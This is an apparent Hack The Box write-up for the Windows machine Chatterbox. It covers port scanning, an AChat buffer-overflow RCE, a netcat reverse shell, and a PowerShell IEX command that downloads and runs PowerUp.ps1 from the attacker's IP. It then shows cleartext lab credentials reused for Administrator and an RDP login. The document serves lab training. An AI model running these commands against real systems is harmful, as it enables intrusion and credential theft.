---

layout: /src/layouts/MarkdownPostLayout_HTB.astro
title: Chatterbox Hackthebox Write-Up
author: Adrian Reategui
description: "Chatterbox machine from hackthebox is an easy windows machine were we're gonna exploit an HTTP service in order to obtain credentials to connect to the victim machine using RDP."
image:
  url: "/images/posts/Chatterbox.webp"
  alt: "Chatterbox machine from hackthebox is an easy windows machine were we're gonna exploit an HTTP service in order to obtain credentials to connect to the victim machine using RDP."
pubDate: 2025-04-04
tags:
  [
    "Windows", "Hackthebox", "Achat", "Writeup", "RDP"
  ]
languages: []

---

<!-- ![alt](./Chatterbox/efeeleprofile.webp) -->
## 📝 SUMMARY
 This machine has one HTTP service running on port 9255 however when trying to access to the url I didnt show any content at all, so doing research I found a Remote Execution BOF exploit in exploit database, I then change the script with my payload and I was able to recieved a ping, so I then was able to send a revershell to my kali machine, enumerating the system didnt find anything interesting, however when using PowerUp.ps1 I found Alfred's credentials in clear text, so I decided to try them with the Administrator and it was pwned! However when trying to read the root flag eventhough i was an administrator i wasnt able to, so i decided to open up RDP port and access to it using rdesktop being able to read the flag

## 📄 NMAP SCAN
```python
	# Nmap 7.95 scan initiated Thu May  8 14:23:25 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p135,139,445,9255,9256,49152,49153,49154,49155,49156,49157 -oN targeted 10.10.10.74
	Nmap scan report for 10.10.10.74
	Host is up (0.27s latency).
	
	PORT      STATE SERVICE      VERSION
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
	9255/tcp  open  http         AChat chat system httpd
	|_http-title: Site doesn't have a title.
	|_http-server-header: AChat
	9256/tcp  open  achat        AChat chat system
	49152/tcp open  msrpc        Microsoft Windows RPC
	49153/tcp open  msrpc        Microsoft Windows RPC
	49154/tcp open  msrpc        Microsoft Windows RPC
	49155/tcp open  msrpc        Microsoft Windows RPC
	49156/tcp open  msrpc        Microsoft Windows RPC
	49157/tcp open  msrpc        Microsoft Windows RPC
	Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb-os-discovery: 
	|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
	|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
	|   Computer name: Chatterbox
	|   NetBIOS computer name: CHATTERBOX\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-05-08T05:24:37-04:00
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2:1:0: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2025-05-08T09:24:39
	|_  start_date: 2025-05-08T09:21:53
	|_clock-skew: mean: 6h20m00s, deviation: 2h18m34s, median: 4h59m59s
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Thu May  8 14:24:52 2025 -- 1 IP address (1 host up) scanned in 87.19 seconds

```
## 🔍 ENUMERATION
- We found a **Achat** service that is running on port 9255 however we cant access to the webpage, when searching for exploit we found a RCE trough a BOF
![alt](/images/posts/chatterbox.png)
- I then created a payload to send a ping to my kali machine
![alt](/images/posts/chatterbox2.webp)
- Then i modified the script to add my payload and when i ran it i received a ping to my kali machine!
```bash
   sudo tcpdump -i tun0 icmp
```
![alt](/images/posts/chatterbox3.webp)
- I then downloaded the nc.exe binary to my kali machine and crafted a payload to connect to my smbserver to access the nc.exe and send a revershell to my kali machine
![alt](/images/posts/chatterbox4.webp)

![alt](/images/posts/chatterbox5.webp)
- And I received a connection as the user alfred!
```bash
   rlwrap -cAr nc -nlvp 443
```
![alt](/images/posts/chatterbox6.webp)
## USER FLAG
```c#
	C:\>whoami & ipconfig & type C:\Users\alfred\Desktop\user.txt
	whoami & ipconfig & type C:\Users\alfred\Desktop\user.txt
	chatterbox\alfred
	
	Windows IP Configuration
	
	
	Ethernet adapter Local Area Connection 4:
	
	   Connection-specific DNS Suffix  . : 
	   IPv4 Address. . . . . . . . . . . : 10.10.10.74
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . : 10.10.10.2
	
	Tunnel adapter isatap.{111D2FF5-EF2C-4D77-B44C-DBCE3AAABF4B}:
	
	   Media State . . . . . . . . . . . : Media disconnected
	   Connection-specific DNS Suffix  . : 
	ebdac18bc919737b4dc8b172639276b8
```
## 🚀 PRIVILEGE ESCALATION
- We use PowerUp to find possibles ways to escalate our privilege and we found alfred credentials in clear text
```powershell
   IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22/PowerUp.ps1')
```
![alt](/images/posts/chatterbox7.webp)
- Using netexec we try Alfred password as the administrator password and it was correct!
```bash
   netexec smb 10.10.10.74 -u 'Administrator' -p 'Welcome1!'
```
![alt](/images/posts/chatterbox8.webp)
## ROOT FLAG
- I opened rdp port and connected using rdesktop and I was then able to read the users root.txt
```bash
   rdesktop -u Administrator -p 'Welcome1!' 10.10.10.74
```
![alt](/images/posts/chatterbox10.webp)
![alt](/images/posts/chatterbox9.webp)
